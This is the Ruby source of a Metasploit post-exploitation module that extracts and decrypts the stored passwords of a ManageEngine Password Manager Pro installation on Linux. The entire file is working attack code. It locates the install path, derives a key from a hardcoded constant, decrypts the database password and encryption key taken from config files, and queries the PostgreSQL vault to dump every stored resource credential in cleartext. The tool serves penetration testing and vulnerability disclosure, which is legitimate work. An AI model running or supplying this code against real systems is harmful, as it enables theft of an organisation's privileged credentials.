##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Process

  HARDCODED_KEY = '7n3tP'.freeze
  SERVICE_DIR = '/etc/init.d'.freeze
  PMP_SERVICE = 'pmp-service'.freeze
  DB_CONF_PATH = 'conf/database_params.conf'.freeze
  MANAGE_KEY_CONF_PATH = 'conf/manage_key.conf'.freeze
  SALT = (1..8).map(&:chr).join.freeze
  ITERATIONS = 1024

  ResourceCredential = Struct.new(:resource_name, :resource_url, :account_notes, :login_name, :password)

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Gather ManageEngine Password Manager Pro Password Extractor',
        'Description' => %q{
          This module gathers the encrypted passwords stored by Password Manager
          Pro and decrypt them using key materials stored in multiple
          configuration files.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Author' => [
          'Travis Kaun', # Original Research and PoC
          'Rob Simon', # Original Research and PoC
          'Charles Yost', # Original Research and PoC
          'Christophe De La Fuente' # MSF module
        ],
        'References' => [
          [ 'URL', 'https://www.trustedsec.com/blog/the-curious-case-of-the-password-database/' ],
          [ 'URL', 'https://github.com/trustedsec/Zoinks/blob/main/zoinks.py' ]
        ],
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ],
          'Reliability' => [ ]
        }
      )
    )

    register_options([
      OptString.new('INSTALL_PATH', [false, 'The Password Manager Pro installation path. The module will try to auto detect it if not set.']),
      OptAddress.new('PG_HOST', [false, 'The PostgreSQL host', '127.0.0.1']),
      OptPort.new('PG_PORT', [false, 'The PostgreSQL port', 2345])
    ])
  end

  def detect_process
    # PMP usually starts two processes from its own installation path: `java` and `postgres`.
    # These processes are shipped with the standard installation package and are used by default.
    vprint_status('Trying to detect path from the PMP related processes')

    paths_to_check = [
      '/jre/bin/java',
      '/pgsql/bin/postgres'
    ]

    paths_to_check.each do |path|
      found_path = shell_get_processes&.find do |process|
        process['name'] =~ /pmp.*#{path}/i
      end
      return found_path['name'].split(path).first if found_path
    end
    vprint_error('Cannot detect the installation path from the PMP processes')

    nil
  end

  def detect_service
    # Check if PMP is installed as a service. The default Linux installer
    # just create a symlink to the `pmp-service` service script in `/etc/init.d/`.
    vprint_status('Trying to detect path from the PMP service')

    pmp_service_path = "#{SERVICE_DIR}/#{PMP_SERVICE}"

    begin
      pmp_file = stat(pmp_service_path)
    rescue StandardError => e
      vprint_error("Error when reading `#{pmp_service_path}`: #{e}")
      return
    end
    unless pmp_file
      vprint_error("PMP service script `#{pmp_service_path}` not found")
      return
    end

    unless pmp_file.symlink?
      vprint_error("`#{pmp_service_path}` is not a symlink and the installation path cannot be detected")
      return
    end

    begin
      cmd = "readlink -f '#{pmp_service_path}'"
      pmp_service_real = cmd_exec(cmd)
    rescue StandardError => e
      vprint_error("Error when executing `#{cmd}`: #{e}")
      return
    end
    unless pmp_service_real
      vprint_error("Cannot resolve the symlink #{pmp_service_path}")
    end

    install_dir = pmp_service_real.split('/')
    if install_dir.pop(2) == ['bin', PMP_SERVICE]
      return install_dir.join('/')
    end

    vprint_error("Cannot detect the installation path from the resolved symlink `#{pmp_service_real}`")

    nil
  end

  def detect_install_path
    vprint_status('Detecting installation path')
    detect_service || detect_process
  end

  def decrypt_text(b64_ciphertext, enc_key)
    raw_ciphertext = Rex::Text.decode_base64(b64_ciphertext)

    cipher = OpenSSL::Cipher.new('AES-256-CTR')
    cipher.decrypt
    cipher.iv = raw_ciphertext[0, 16]

    digest = OpenSSL::Digest.new('SHA1')
    key = OpenSSL::PKCS5.pbkdf2_hmac(enc_key, SALT, ITERATIONS, cipher.key_len, digest)
    cipher.key = key

    decrypted = cipher.update(raw_ciphertext[16..])
    decrypted << cipher.final
  end

  def get_db_password(install_path, enc_key)
    vprint_status('Getting the database password')

    db_path = "#{install_path}/#{DB_CONF_PATH}"

    begin
      db_conf = read_file(db_path)
    rescue StandardError => e
      print_error("Error reading `#{db_path}`: #{e}")
      return
    end
    unless db_conf
      print_error("Database configuration file `#{db_path}` not found")
      return
    end

    b64_password = db_conf.match(/password=(.+)$/)&.captures&.first
    unless b64_password
      print_error('Unable to retrieve the database password')
      return
    end

    decrypt_text(b64_password, enc_key)
  end

  def get_db_enc_key(install_path)
    vprint_status('Getting the database encryption key')

    manage_key_conf_path = "#{install_path}/#{MANAGE_KEY_CONF_PATH}"
    begin
      pmp_key_path = read_file(manage_key_conf_path)
    rescue StandardError => e
      print_error("Error reading `#{manage_key_conf_path}`: #{e}")
      return
    end
    unless pmp_key_path
      print_error("Database manage_key configuration file `#{manage_key_conf_path}` not found")
      return
    end
    unless exist?(pmp_key_path)
      print_error("Database key configuration file `#{pmp_key_path}` not found")
      return
    end
    vprint_good("Found the database key configuration: #{pmp_key_path}")

    begin
      pmp_key = read_file(pmp_key_path)
    rescue StandardError => e
      print_error("Error reading `#{pmp_key_path}`: #{e}")
      return
    end
    unless pmp_key
      print_error("Database key configuration file #{pmp_key_path} not found")
      return
    end

    pmp_key.match(/ENCRYPTIONKEY=(.+)$/)&.captures&.first
  end

  def pg_host
    @pg_host ||= datastore['PG_HOST'].blank? ? '127.0.0.1' : datastore['PG_HOST']
  end

  def pg_port
    @pg_port ||= datastore['PG_PORT'].blank? ? 2345 : datastore['PG_PORT']
  end

  def psql_path(install_path)
    return @psql_path if @psql_path

    psql = "#{install_path}/pgsql/bin/psql"
    raise Rex::RuntimeError, "Cannot find `pgsql` in the installation path `#{psql}`" unless exist?(psql)

    @psql_path = psql
  end

  def query_db(query, install_path, db_password)
    cmd = "env PGPASSWORD=#{db_password} #{psql_path(install_path)} -w -A -t -h #{pg_host} -p #{pg_port} -U pmpuser -d PassTrix -c "
    cmd << "\"#{query}\""
    dlog("psql command: #{cmd}")

    result, success = cmd_exec_with_result(cmd)
    raise Rex::RuntimeError, "psql returned an error: #{result}" unless success

    result
  end

  def process_key(key)
    key = key.ljust(32)
    key = Rex::Text.decode_base64(key) if key.length > 32

    # This mimics how Java handles: new String(aeskey, 'UTF-8').toCharArray()
    key.force_encoding('utf-8').scrub.b
  end

  def get_notesdescription(install_path, db_password, db_enc_key)
    begin
      cmd = 'SELECT notesdescription FROM Ptrx_NotesInfo'
      b64_notesdescription = query_db(cmd, install_path, db_password)
    rescue StandardError => e
      print_error("Error while querying `Ptrx_NotesInfo` table with `psql`: #{e}")
      return
    end

    enc_key = process_key(db_enc_key)
    decrypt_text(b64_notesdescription, enc_key)
  end

  def dump_credentials(install_path, db_password, db_enc_key, notesdescription)
    begin
      cmd = "SELECT ptrx_resource.RESOURCENAME,
                    ptrx_resource.RESOURCEURL,
                    ptrx_password.DESCRIPTION,
                    ptrx_account.LOGINNAME,
                    decryptschar(ptrx_passbasedauthen.PASSWORD,\'#{notesdescription}\')
             FROM ptrx_passbasedauthen
             LEFT JOIN ptrx_password ON ptrx_passbasedauthen.PASSWDID = ptrx_password.PASSWDID
             LEFT JOIN ptrx_account ON ptrx_passbasedauthen.PASSWDID = ptrx_account.PASSWDID
             LEFT JOIN ptrx_resource ON ptrx_account.RESOURCEID = ptrx_resource.RESOURCEID"
      passwords = query_db(cmd, install_path, db_password)
    rescue StandardError => e
      print_error("Error while dumping credentials with `psql`: #{e}")
      return
    end

    enc_key = process_key(db_enc_key)
    passwords.each_line.map do |password|
      r_name, r_url, desc, name, pass = password.strip.split('|')
      decrypted_password = decrypt_text(pass, enc_key)
      ResourceCredential.new(r_name, r_url, desc, name, decrypted_password)
    end
  end

  def report_creds(username, password)
    credential_data = {
      origin_type: :session,
      post_reference_name: fullname,
      private_data: password,
      private_type: :password,
      session_id: session_db_id,
      username: username,
      workspace_id: myworkspace_id
    }
    create_credential(credential_data)
  rescue StandardError => e
    vprint_error("Error reporting credentials `#{username}:#{password}`: #{e}")
    elog(e)
  end

  def display_and_report(resource_credentials)
    cred_tbl = Rex::Text::Table.new({
      'Header' => 'Password Manager Pro Credentials',
      'Indent' => 1,
      'Columns' => ['Resource Name', 'Resource URL', 'Account Notes', 'Login Name', 'Password']
    })

    resource_credentials.each do |res_cred|
      report_creds(res_cred.login_name, res_cred.password)

      cred_tbl << [
        res_cred.resource_name,
        res_cred.resource_url,
        res_cred.account_notes,
        res_cred.login_name,
        res_cred.password
      ]
    end

    print_line(cred_tbl.to_s)
  end

  def run
    install_path = datastore['INSTALL_PATH'].blank? ? detect_install_path : datastore['INSTALL_PATH']
    unless install_path
      fail_with(Failure::BadConfig,
                'Unable to detect the PMP installation path. Use the INSTALL_PATH option instead.')
    end
    print_status("Installation path: #{install_path}")

    encryption_key = Digest::MD5.new.update(HARDCODED_KEY).hexdigest

    db_password = get_db_password(install_path, encryption_key)
    unless db_password
      fail_with(Failure::Unknown, 'Unable to get the database password')
    end
    print_good("Database password: #{db_password}")

    db_enc_key = get_db_enc_key(install_path)
    unless db_enc_key
      fail_with(Failure::Unknown, 'Unable to get the database encryption key')
    end
    print_good("Database encryption key: #{db_enc_key}")

    notesdescription = get_notesdescription(install_path, db_password, db_enc_key)
    unless notesdescription
      fail_with(Failure::Unknown, 'Unable to get `notesdescription` from the database')
    end
    print_good("`notesdescription` field value: #{notesdescription}")

    resource_credentials = dump_credentials(install_path, db_password, db_enc_key, notesdescription)
    unless resource_credentials
      fail_with(Failure::Unknown, 'No credentials found in the database')
    end

    display_and_report(resource_credentials)
  end
end
